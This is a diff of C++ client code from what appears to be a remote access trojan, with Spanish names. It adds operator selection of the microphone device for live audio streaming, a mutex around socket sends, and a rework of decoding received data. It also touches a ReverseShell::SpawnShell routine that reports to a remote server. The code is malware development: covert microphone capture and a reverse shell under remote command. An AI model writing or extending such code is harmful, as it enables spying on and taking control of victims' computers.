@@ -153,6 +153,7 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
             this->mod_Mic = new Mod_Mic(this);
         }
         this->mod_Mic->sckSocket = this->sckSocket;
+        this->mod_Mic->p_DeviceID = atoi(strIn[1].c_str());
         this->mod_Mic->m_EmpezarLive();
     }
 
@@ -235,7 +236,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     for (int iBytePos = 0; iBytePos < iDataSize; iBytePos++) {
         std::memcpy(newBuffer + iBytePos, &cData[iBytePos], 1);
     }
-    
+    int iEnviado = 0;
     if (isBlock) {
 #ifdef ___DEBUG_
         std::cout << "[BLOCK-MODE] send" << iDataSize << " bytes\n";
@@ -248,8 +249,11 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
             error();
 #endif
         }
-        int iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
-
+        
+        std::unique_lock<std::mutex> lock(this->sck_mutex);
+        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        lock.unlock();
+        
         //Restaurar
         iBlock = 1;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
@@ -257,18 +261,19 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
             error();
 #endif
         }
-        if (newBuffer != nullptr) {
-            delete[] newBuffer;
-        }
-        return iEnviado;
+        
+    } else {
+        std::unique_lock<std::mutex> lock(this->sck_mutex);
+        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        lock.unlock();
+        
     }
-    else {
-        int iSent = send(pSocket, newBuffer, iDataSize, pFlags);
-        if (newBuffer != nullptr) {
-            delete[] newBuffer;
-        }
-        return iSent;
+
+    if (newBuffer != nullptr) {
+        delete[] newBuffer;
     }
+
+    return iEnviado;
 }
 
 int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
@@ -280,7 +285,6 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
 
     int iRecibido = 0;
     if (isBlock) {
-        std::cout << "[BLOCK-MODE] recv " << std::endl;
         //Hacer el socket block
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
@@ -289,8 +293,12 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
             error();
 #endif
         }
+        //std::unique_lock<std::mutex> lock(this->sck_mutex);
+        //std::cout << "RECV LOCKED\n";
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
-        std::cout << "Recibidos " << iRecibido << " bytes\n";
+        //lock.unlock();
+        //std::cout << "RECV UNLOCKED\n";
+
         if (iRecibido <= 0) {
             if (cTmpBuff) {
                 ZeroMemory(cTmpBuff, pLen);
@@ -302,13 +310,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
 
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
 
-        std::string strOut = "";
-        iRecibido = 0;
-        for (auto c : bOut) {
-            strOut.append(1, c);
-            iRecibido++;
+        iRecibido = bOut.size();
+        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
+            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
         }
-        memccpy(pBuffer, strOut.c_str(), '\0', 1024);
 
         //Restaurar
         iBlock = 1;
@@ -324,9 +329,12 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         return iRecibido;
     }
     else {
-
+        //std::unique_lock<std::mutex> lock(this->sck_mutex);
+        //std::cout << "RECV LOCKED\n";
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
-        std::cout << "Recibidos " << iRecibido << " bytes\n";
+        //lock.unlock();
+        //std::cout << "RECV UNLOCKED\n";
+
         if (iRecibido <= 0) {
             if (cTmpBuff) {
                 ZeroMemory(cTmpBuff, pLen);
@@ -336,13 +344,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         }
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
 
-        std::string strOut = "";
-        iRecibido = 0;
-        for (auto c : bOut) {
-            strOut.append(1, c);
-            iRecibido++;
+        iRecibido = bOut.size();
+        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
+            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
         }
-        memccpy(pBuffer, strOut.c_str(), '\0', 1024);
 
         if (cTmpBuff) {
             ZeroMemory(cTmpBuff, pLen);
@@ -410,6 +415,7 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     
     //La shell esta corriendo
     this->isRunning = true;
+    std::cout << "Running...\n";
     if (this->copy_ptr != nullptr) {
         this->copy_ptr->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
     }
